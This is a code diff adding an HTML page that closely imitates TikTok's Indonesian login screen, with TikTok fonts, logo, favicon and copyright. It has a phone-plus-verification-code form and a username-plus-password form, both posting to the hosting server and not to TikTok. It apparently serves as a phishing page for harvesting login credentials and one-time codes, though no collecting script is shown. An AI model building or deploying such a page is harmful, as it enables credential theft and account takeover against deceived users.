@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="id-ID" data-theme="dark" style="height:100%;min-height:100%" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log masuk | TikTok</title>
+<meta name="description" content="Log in or sign up for an account on TikTok.">
+<link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
+<style>
+  @font-face {
+    font-family: TikTokFont;
+    src: url(https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Regular.woff2) format("woff2");
+    font-weight: 400; font-style: normal; font-display: fallback;
+  }
+  @font-face {
+    font-family: TikTokFont;
+    src: url(https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Semibold.woff2) format("woff2");
+    font-weight: 600; font-style: normal; font-display: fallback;
+  }
+  @font-face {
+    font-family: TikTokFont;
+    src: url(https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Bold.woff2) format("woff2");
+    font-weight: 700; font-style: normal; font-display: fallback;
+  }
+  @font-face {
+    font-family: TikTokDisplayFont;
+    src: url(https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokDisplayFont-Bold.woff2) format("woff2");
+    font-weight: 700; font-style: normal; font-display: fallback;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: TikTokFont, Arial, Tahoma, PingFangSC, sans-serif;
+    font-size: 14px;
+    color: rgba(255,255,255,.9);
+    background-color: #121212;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    -webkit-font-smoothing: antialiased;
+  }
+  a { color: rgba(255,255,255,.9); text-decoration: none; cursor: pointer; }
+  a:hover { text-decoration: underline; }
+
+  /* Header */
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    height: 60px;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    background: #121212;
+    z-index: 3000;
+    padding: 0 20px;
+  }
+  .header svg { display: block; }
+  .help-link {
+    font-weight: 600;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    color: rgba(255,255,255,.5);
+  }
+
+  /* Body */
+  .body-container {
+    margin-top: 60px;
+    width: 100%;
+    flex: 1;
+    overflow: auto;
+  }
+  .login-container {
+    width: 363px;
+    margin: 64px auto 0;
+    text-align: center;
+  }
+  .title {
+    font-family: TikTokDisplayFont, TikTokFont, Arial, sans-serif;
+    font-size: 33px;
+    font-weight: bold;
+    margin: 56px auto 16px;
+  }
+
+  /* Tabs */
+  .tab-container {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid rgba(255,255,255,.12);
+  }
+  .tab {
+    flex: 1;
+    padding: 12px 0;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    color: rgba(255,255,255,.5);
+    background: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    font-family: inherit;
+  }
+  .tab.active {
+    color: rgba(255,255,255,.9);
+    border-bottom-color: #fff;
+  }
+
+  /* Phone form */
+  .form-section { text-align: left; margin-top: 8px; }
+  .phone-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .country-select {
+    background: rgba(255,255,255,.08);
+    border: 1px solid rgba(255,255,255,.12);
+    border-radius: 4px;
+    color: #fff;
+    padding: 10px 12px;
+    font-size: 16px;
+    font-family: inherit;
+    cursor: pointer;
+    min-width: 90px;
+  }
+  .country-select option { background: #2e2e2e; color: #fff; }
+  .input-field {
+    width: 100%;
+    background: rgba(255,255,255,.08);
+    border: 1px solid rgba(255,255,255,.12);
+    border-radius: 4px;
+    color: #fff;
+    padding: 10px 12px;
+    font-size: 16px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .2s;
+  }
+  .input-field::placeholder { color: rgba(255,255,255,.34); }
+  .input-field:focus { border-color: rgba(255,255,255,.5); }
+
+  .code-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .code-row .input-field { flex: 1; }
+  .send-code-btn {
+    background: none;
+    border: none;
+    color: rgba(255,255,255,.5);
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    white-space: nowrap;
+    font-family: inherit;
+    padding: 10px 0;
+  }
+
+  .password-link {
+    display: block;
+    color: rgba(255,255,255,.5);
+    font-size: 14px;
+    margin-bottom: 20px;
+    cursor: pointer;
+    text-align: left;
+  }
+
+  .login-btn {
+    width: 100%;
+    height: 46px;
+    border: none;
+    border-radius: 4px;
+    background: #fe2c55;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    transition: opacity .2s;
+  }
+  .login-btn:hover { opacity: .9; }
+  .login-btn:disabled {
+    background: rgba(255,255,255,.08);
+    color: rgba(255,255,255,.34);
+    cursor: not-allowed;
+  }
+
+  /* Email/Username form */
+  .email-form .input-field { margin-bottom: 16px; }
+  .password-row {
+    position: relative;
+    margin-bottom: 8px;
+  }
+  .password-row .input-field { padding-right: 70px; }
+  .show-pw-btn {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: rgba(255,255,255,.5);
+    font-size: 13px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .forgot-link {
+    display: block;
+    color: rgba(255,255,255,.5);
+    font-size: 13px;
+    text-align: left;
+    margin-bottom: 20px;
+  }
+
+  /* Divider */
+  .divider-section {
+    display: flex;
+    align-items: center;
+    margin: 24px 0;
+  }
+  .divider-line {
+    flex: 1;
+    height: 1px;
+    background: rgba(255,255,255,.12);
+  }
+  .divider-text {
+    padding: 0 16px;
+    color: rgba(255,255,255,.34);
+    font-size: 13px;
+  }
+
+  /* Social buttons */
+  .social-btn {
+    width: 100%;
+    height: 46px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 12px;
+    border: 1px solid rgba(255,255,255,0);
+    background: rgba(255,255,255,.08);
+    color: rgba(255,255,255,.9);
+    font-family: inherit;
+    position: relative;
+    transition: border-color .2s, background .2s;
+  }
+  .social-btn:hover {
+    border-color: rgb(208,209,211);
+    background: #121212;
+  }
+  .social-btn .icon {
+    position: absolute;
+    left: 14px;
+    width: 20px;
+    height: 20px;
+  }
+
+  /* Footer */
+  .agreement {
+    width: 100%;
+    text-align: center;
+    padding: 16px 30px;
+    margin-bottom: 80px;
+  }
+  .agreement p {
+    color: rgba(255,255,255,.5);
+    font-size: 12px;
+    line-height: 15px;
+    max-width: 337px;
+    margin: 0 auto;
+  }
+  .agreement a { color: rgba(255,255,255,.9); }
+
+  .bottom-bar {
+    border-top: .5px solid rgba(255,255,255,.12);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 64px;
+    font-size: 15px;
+  }
+  .bottom-bar span { color: rgba(255,255,255,.5); }
+  .bottom-bar a {
+    color: #ff3b5c;
+    font-weight: 600;
+    margin-left: 5px;
+    font-size: 15px;
+  }
+
+  .page-footer {
+    height: 84px;
+    background: #121212;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 144px;
+  }
+  .lang-select {
+    background: transparent;
+    border: 1px solid #8a8b91;
+    border-radius: 2px;
+    color: #fff;
+    padding: 6px 16px;
+    font-size: 14px;
+    font-family: inherit;
+    cursor: pointer;
+  }
+  .lang-select option { background: #2e2e2e; }
+  .copyright {
+    font-family: TikTokDisplayFont, TikTokFont, sans-serif;
+    font-size: 14px;
+    color: #8a8b91;
+    font-weight: 500;
+  }
+
+  /* Hidden utility */
+  .hidden { display: none !important; }
+
+  @media (max-width: 480px) {
+    .login-container { width: 90%; }
+    .page-footer { padding: 0 20px; flex-direction: column; height: auto; gap: 10px; padding: 16px 20px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <a href="https://www.tiktok.com" aria-label="TikTok">
+    <svg width="118" height="42" viewBox="0 0 118 42" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M9.87 16.42H6.76V29.56H3.1V16.42H0V13.56h9.87v2.86z" fill="white"/>
+      <path d="M11.9 18.15c0-.66.23-1.22.7-1.68a2.3 2.3 0 0 1 1.7-.7c.66 0 1.22.23 1.68.7.46.46.7 1.02.7 1.68v11.4h-4.78v-11.4z" fill="white"/>
+      <path d="M24.77 13.56h3.66v9.77l5.66-9.77h3.66l-5.66 9.77 5.66 6.23h-3.66l-5.66-6.23v6.23h-3.66V13.56z" fill="white"/>
+      <path d="M46.27 16.42h-3.1V29.56h-3.67V16.42h-3.1V13.56h9.87v2.86z" fill="white"/>
+      <path d="M55.37 13.03c2.4 0 4.43.84 6.1 2.5 1.67 1.67 2.5 3.7 2.5 6.1s-.83 4.43-2.5 6.1c-1.67 1.67-3.7 2.5-6.1 2.5s-4.43-.83-6.1-2.5c-1.67-1.67-2.5-3.7-2.5-6.1s.83-4.43 2.5-6.1c1.67-1.66 3.7-2.5 6.1-2.5zm0 3.46c-1.42 0-2.63.5-3.63 1.5s-1.5 2.2-1.5 3.63.5 2.63 1.5 3.63 2.2 1.5 3.63 1.5 2.63-.5 3.63-1.5 1.5-2.2 1.5-3.63-.5-2.63-1.5-3.63-2.2-1.5-3.63-1.5z" fill="white"/>
+      <path d="M71.07 13.56h3.66v9.77l5.66-9.77h3.66l-5.66 9.77 5.66 6.23h-3.66l-5.66-6.23v6.23h-3.66V13.56z" fill="white"/>
+      <path fill="#25F4EE" d="M93.3 7.76v16.8c0 2.86 2.32 5.18 5.18 5.18 2.86 0 5.18-2.32 5.18-5.18V7.76h3.66v16.8c0 4.88-3.96 8.84-8.84 8.84s-8.84-3.96-8.84-8.84V7.76h3.66z"/>
+      <path fill="#FE2C55" d="M107.32 7.76c2.04 3.54 5.82 5.92 10.16 5.92v3.66c-4.08 0-7.76-1.72-10.36-4.48v12.7c0 4.88-3.96 8.84-8.84 8.84"/>
+    </svg>
+  </a>
+  <a class="help-link" href="#">
+    <svg width="20" height="20" viewBox="0 0 48 48" fill="currentColor"><path d="M24 4C12.96 4 4 12.95 4 24s8.96 20 20 20 20-8.95 20-20S35.04 4 24 4zm2 34h-4v-4h4v4zm4.13-15.49l-1.79 1.84C26.9 25.79 26 27 26 30h-4v-1c0-2.21.9-4.21 2.34-5.66l2.49-2.52A3.95 3.95 0 0 0 28 18c0-2.21-1.79-4-4-4s-4 1.79-4 4h-4c0-4.42 3.58-8 8-8s8 3.58 8 8c0 1.76-.72 3.35-1.87 4.51z"/></svg>
+  </a>
+</div>
+
+<!-- Body -->
+<div class="body-container">
+  <div class="login-container">
+    <h2 class="title">Log masuk</h2>
+
+    <!-- Tabs -->
+    <div class="tab-container">
+      <button class="tab active" id="tab-phone" onclick="switchTab('phone')">Telepon</button>
+      <button class="tab" id="tab-email" onclick="switchTab('email')">Masuk dengan alamat email atau nama pengguna</button>
+    </div>
+
+    <!-- Phone Form -->
+    <form method="POST" action="" id="form-phone" class="form-section">
+      <div class="phone-row">
+        <select class="country-select" name="country_code">
+          <option value="+62">ID +62</option>
+          <option value="+1">US +1</option>
+          <option value="+44">UK +44</option>
+          <option value="+91">IN +91</option>
+          <option value="+81">JP +81</option>
+          <option value="+60">MY +60</option>
+          <option value="+65">SG +65</option>
+        </select>
+        <input type="text" name="mobile" class="input-field" placeholder="Nomor telepon">
+      </div>
+      <div class="code-row">
+        <input type="text" name="code" class="input-field" placeholder="Masukkan kode 6 digit" maxlength="6">
+        <button type="button" class="send-code-btn">Kirim kode</button>
+      </div>
+      <a class="password-link" href="#" onclick="switchTab('email');return false;">Masuk dengan kata sandi</a>
+      <button type="submit" class="login-btn">Log masuk</button>
+    </form>
+
+    <!-- Email Form -->
+    <form method="POST" action="" id="form-email" class="form-section hidden">
+      <div class="email-form">
+        <input type="text" name="username" class="input-field" placeholder="Alamat email atau nama pengguna">
+        <div class="password-row">
+          <input type="password" name="password" id="pw-field" class="input-field" placeholder="Kata sandi">
+          <button type="button" class="show-pw-btn" onclick="togglePw()">Tampilkan</button>
+        </div>
+        <a class="forgot-link" href="#">Lupa kata sandi?</a>
+      </div>
+      <button type="submit" class="login-btn">Log masuk</button>
+    </form>
+
+    <!-- Agreement -->
+    <div class="agreement">
+      <p>Dengan melanjutkan menggunakan akun yang terletak di <a href="#">Wilayah</a>, Anda menyetujui <a href="#">Ketentuan Layanan</a> dan menyatakan bahwa Anda telah membaca <a href="#">Kebijakan Privasi</a> kami.</p>
+    </div>
+  </div>
+
+  <!-- Bottom Sign Up Bar -->
+  <div class="bottom-bar">
+    <span>Belum punya akun?</span>
+    <a href="#">Daftar</a>
+  </div>
+</div>
+
+<!-- Page Footer -->
+<div class="page-footer">
+  <select class="lang-select">
+    <option>Bahasa Indonesia</option>
+    <option>English</option>
+    <option>日本語</option>
+    <option>한국어</option>
+  </select>
+  <div class="copyright">© 2024 TikTok</div>
+</div>
+
+<script>
+function switchTab(tab) {
+  document.getElementById('tab-phone').classList.toggle('active', tab === 'phone');
+  document.getElementById('tab-email').classList.toggle('active', tab === 'email');
+  document.getElementById('form-phone').classList.toggle('hidden', tab !== 'phone');
+  document.getElementById('form-email').classList.toggle('hidden', tab !== 'email');
+}
+function togglePw() {
+  var f = document.getElementById('pw-field');
+  var btn = f.nextElementSibling;
+  if (f.type === 'password') { f.type = 'text'; btn.textContent = 'Sembunyikan'; }
+  else { f.type = 'password'; btn.textContent = 'Tampilkan'; }
+}
+</script>
+</body>
+</html>
